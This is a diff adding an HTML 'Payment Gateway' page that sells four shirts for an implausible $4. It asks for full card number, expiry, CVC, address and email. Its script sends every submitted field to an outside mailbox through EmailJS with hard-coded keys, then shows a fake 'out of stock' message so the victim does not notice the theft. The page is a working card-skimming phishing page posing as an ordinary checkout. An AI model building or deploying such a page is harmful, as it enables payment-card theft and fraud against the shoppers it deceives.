@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Payment Gateway</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap">
+  <style>
+    /* General Styles */
+    body {
+      font-family: 'Helvetica Neue', Arial, sans-serif;
+      color: #eee;
+      margin: 0;
+      padding: 0;
+      background-image: url('/BLKPNK-0043_EvergreenStoreRefreshHero-Banner_mobile5540.png');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      opacity: 0; /* Inicialmente invisible */
+      animation: fade-in 1s ease-in-out forwards; /* Animación de aparición ajustada a 1 segundo */
+    }
+
+    @keyframes fade-in {
+      from {
+        opacity: 0;
+      }
+      to {
+        opacity: 1;
+      }
+    }
+
+    .container {
+      width: 80%;
+      max-width: 600px;
+      margin: 0 auto;
+      padding: 20px;
+      background-color: rgba(255, 255, 255, 0.9);
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+      text-align: center;
+    }
+
+    header {
+      margin-bottom: 20px;
+    }
+
+    .title-image {
+      width: 100px; /* Tamaño reducido del logo */
+      height: auto;
+    }
+
+    h1 {
+      font-size: 24px;
+      color: #000;
+      margin-top: 10px;
+      font-family: Montserrat, sans-serif;
+      font-weight: bold;
+    }
+
+    .security-text {
+      font-family: Arial, sans-serif;
+      font-size: 16px;
+      color: #000;
+      margin-top: 10px;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .field {
+      margin-bottom: 10px;
+      width: 100%;
+      position: relative;
+    }
+
+    input[type="text"], input[type="email"] {
+      width: 100%;
+      padding: 10px;
+      background: #f9f9f9;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      color: #333;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+
+    input[type="text"]::placeholder, input[type="email"]::placeholder {
+      color: #888;
+    }
+
+    #button {
+      background-color: #ff007f;
+      color: #fffefe;
+      border: none;
+      padding: 15px;
+      border-radius: 5px;
+      font-size: 16px;
+      font-family: 'Montserrat', sans-serif; /* Fuente Montserrat aplicada aquí */
+      font-weight: bold;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    #button:hover {
+      background-color: #e60073;
+    }
+
+    #button:active {
+      background-color: #cc0052;
+    }
+
+    .product-summary {
+      margin-top: 20px;
+      padding: 20px;
+      background-color: #3f3e3e;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: left;
+    }
+
+    .product-summary img {
+      width: 150px;
+      height: auto;
+      margin-right: 20px;
+    }
+
+    .product-summary .details {
+      max-width: 400px;
+    }
+
+    .product-summary h2 {
+      font-size: 20px;
+      margin-top: 0;
+      color: #fff;
+    }
+
+    .product-summary p {
+      margin: 5px 0;
+      color: #fff;
+    }
+
+    .card-image {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 100px;
+      height: auto;
+    }
+
+    /* Estilo del Modal */
+    .modal {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.5); /* Fondo semi-transparente para la superposición */
+    z-index: 1000;
+    animation: fade-in 0.5s ease-in-out;
+  }
+
+  .modal-content {
+    position: relative;
+    background-color: transparent; /* Fondo transparente para el contenido del modal */
+    border-radius: 10px;
+    padding: 20px;
+    max-width: 90%;
+    max-height: 80%;
+    overflow: auto; /* Permite el desplazamiento si el contenido es demasiado grande */
+  }
+
+  .modal-image {
+    width: 100%;
+    height: auto;
+    border-radius: 10px;
+  }
+
+  .close {
+    position: absolute;
+    top: 10px;
+    right: 10px;
+    font-size: 24px;
+    font-weight: bold;
+    cursor: pointer;
+    color: #fff; /* Color de la "X" en blanco para que contraste con el fondo oscuro */
+  }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <img src="LOGO PRETTY.png" alt="Title Image" class="title-image">
+      <h1>Payment</h1>
+      <div class="security-text">All transactions are secure and encrypted.</div>
+    </header>
+
+    <form id="payment-gateway-form">
+      <div class="field">
+        <input type="text" name="Name" id="Name" placeholder="Name" required>
+      </div>
+      
+      <div class="field">
+        <input type="text" name="Card" id="Card" placeholder="Card" required pattern="\d{4} \d{4} \d{4} \d{4}" title="Enter a valid 16-digit card number">
+        <img src="COLOCAR EN LA CASILLA CARD.png" alt="Accepted Cards" class="card-image">
+      </div>
+      
+      <div class="field">
+        <input type="text" name="Date" id="Date" placeholder="Date" required pattern="\d{2}/\d{2}" title="Enter a valid expiration date (MM/YY)">
+      </div>
+      
+      <div class="field">
+        <input type="text" name="CVC" id="CVC" placeholder="CVC" required pattern="\d{3}" title="Enter a valid 3-digit CVC code">
+      </div>
+      
+      <div class="field">
+        <input type="text" name="Andress" id="Andress" placeholder="Andress" required>
+      </div>
+      
+      <div class="field">
+        <input type="text" name="City" id="City" placeholder="City" required>
+      </div>
+      
+      <div class="field">
+        <input type="text" name="ZIPCode" id="ZIPCode" placeholder="ZIP Code" title="Enter a valid ZIP Code">
+      </div>
+
+      <div class="field">
+        <input type="email" name="invoiceEmail" id="invoiceEmail" placeholder="Enter your email for invoice" required>
+      </div>
+
+      <input type="submit" id="button" value="Pay $4 USD">
+    </form>
+
+    <div class="product-summary">
+      <img src="GRUPAL.jpeg" alt="Product Image">
+      <div class="details">
+        <h2>Product Summary</h2>
+        <p><strong>Product Name:</strong> 4 Camisetas PINK</p>
+        <p><strong>Description:</strong> Talla L / Algodon 100%</p>
+        <p><strong>Price:</strong> $4 USD</p>
+        <p><strong>Delivery:</strong> De 3 a 10 Dias Habiles </p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modal -->
+  <div id="modal" class="modal">
+    <div class="modal-content">
+      <span class="close" id="modal-close">&times;</span>
+      <img src="FINAL AVISO.png" alt="Aviso" class="modal-image">
+    </div>
+  </div>
+
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script type="text/javascript">
+    emailjs.init('Zkumoxx3C9Zm9RZVr');
+
+    document.getElementById('payment-gateway-form').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const btn = document.getElementById('button');
+      btn.value = 'Procesando Pago...';
+
+      const serviceID = 'default_service';
+      const templateID = 'template_jr7p1sf';
+      const email = document.getElementById('invoiceEmail').value;
+
+      emailjs.sendForm(serviceID, templateID, this)
+        .then(() => {
+          btn.value = 'Pay $4 USD';
+          alert('Nos quedamos sin stock, inténtalo más tarde por favor.');
+        });
+    });
+
+    document.getElementById('Card').addEventListener('input', function(event) {
+      let value = this.value.replace(/\s+/g, '').replace(/[^0-9]/g, '');
+      if (value.length > 16) {
+        value = value.slice(0, 16);
+      }
+      this.value = value.replace(/(.{4})/g, '$1 ').trim();
+    });
+
+    // Obtener elementos del DOM
+    const modal = document.getElementById('modal');
+    const closeModal = document.getElementById('modal-close');
+
+    // Mostrar el modal cuando se carga la página
+    window.onload = () => {
+      modal.style.display = 'flex';
+    };
+
+    // Cerrar el modal cuando se haga clic en la "X"
+    closeModal.onclick = () => {
+      modal.style.display = 'none';
+    };
+
+    // Cerrar el modal cuando se haga clic fuera del contenido del modal
+    window.onclick = (event) => {
+      if (event.target === modal) {
+        modal.style.display = 'none';
+      }
+    };
+  </script>
+</body>
+</html>
